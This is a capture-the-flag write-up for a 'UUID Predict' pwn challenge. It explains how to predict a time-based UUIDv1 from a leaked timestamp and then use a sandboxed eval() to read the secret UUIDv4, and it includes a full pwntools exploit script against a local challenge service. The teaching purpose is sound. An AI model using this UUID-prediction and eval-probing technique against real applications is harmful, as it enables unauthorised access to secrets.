<img src="https://raw.githubusercontent.com/CTFae/media/main/brand/YT-banner.jpg" />

### Challenge: UUID Predict
### Category: Pwn
### Difficulty: Hard
<hr>

#### Challenge Description
This challenge will need users to explore the service, research how UUIDv1 and UUIDv4 are generated, create an exploit script to not just guess UUIDv1 but to steal UUIDv4 from the application.

#### Challenge Screenshot
![chal](https://raw.githubusercontent.com/CTFae/media/main/writeups/uuid_predict-1.png)

#### Solution
The service tells us that if the user can guess the UUIDv1, we can get a free `eval()` statement from inside the service. And if the player can guess the UUIDv4, they will capture the flag. After some research, the player should realize that UUIDv4 cannot be guessed or bruteforced since it is pure random. However, UUIDv1 is based off some static values and ***time***!

After exploring the service, the player should note that the service will tell us what timestamp the UUIDs were generated in before we guess:

![chal](https://raw.githubusercontent.com/CTFae/media/main/writeups/uuid_predict-2.png)

Knowing that UUIDv1 is based off the timestamp and some static values, using the previous UUIDs and the timestamp, the player can reconstruct the current UUIDv1 and submit it.

Upon submitting the UUIDv1, the player will get access to an extremely sandboxed `eval()`. The point of this eval is not code execution, and code execution is impossible anyways due to the sandbox. The player must list the local variables of the application by running `dir()`. After doing so, the player will notice a variable called `self.current_uuid4`. Using the eval statement, the player can get the value of this variable.

After the player steals the UUIDv4 from the service through the eval, they simply submit it and get the flag.


#### Exploit Screenshot
![exploit](https://raw.githubusercontent.com/CTFae/media/main/writeups/uuid_predict-3.png)


#### Exploit Script
```py
from pwn import *
import time_uuid
import re
import socket
import struct

# PWNTools Banner
splash()

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 1, 0))
s.connect(('127.0.0.1', 9009))
r = remote.fromsocket(s)

# Get rid of the menu
r.recvline_contains(b'5.')
r.recv()

# Read the previous UUIDs
r.send(b'3\n')
previous_uuids = r.recvline_contains("UUIDv1").decode('utf-8')
previous_uuid1 = re.match(r"\b(Previous UUIDv1: )(.*)", previous_uuids).group(2)
log.info(f"Previous UUIDv1: {previous_uuid1}")

# Get the timestamp for the UUIDv1
r.recvline_contains(b'5.')
r.recv()
r.send(b'1\n')
uuid1_timestamp = float(re.match(r"\b(.*)(generated at )(.*)( epoch!)", r.recv().decode('utf-8')).group(3))
log.info(f"Current Timestamp: {uuid1_timestamp}")

# Create the UUIDv1 using the time_uuid library
loaded_uuid1 = str(time_uuid.TimeUUID(previous_uuid1).with_timestamp(uuid1_timestamp, randomize=False))
crafted_uuid1 = loaded_uuid1.split('-')[0] + previous_uuid1[8:]
log.info(f"Generated UUIDv1: {crafted_uuid1}")

# Submit the reconstructed UUIDv1
r.send(f"{crafted_uuid1}\n".encode('utf-8'))
r.recvline_contains(b'self')
r.recv()

# Steal the UUIDv4
r.send(b"self.current_uuid4\n")
eval_response = r.recvline()
stolen_uuid4 = eval_response.decode('utf-8')
log.success(f"Stolen UUIDv4: {stolen_uuid4}")

# Submit the UUIDv4
r.recvline_contains(b'5.')
r.recv()
r.send(b"2\n")
r.recv()
r.send(f"{stolen_uuid4}\n".encode('utf-8'))
log.success(f"Grand Prize: {r.recvall().decode('utf-8')}")
```

<hr>

&copy; <a href="https://ctf.ae" target=_blank>CTF.ae</a>
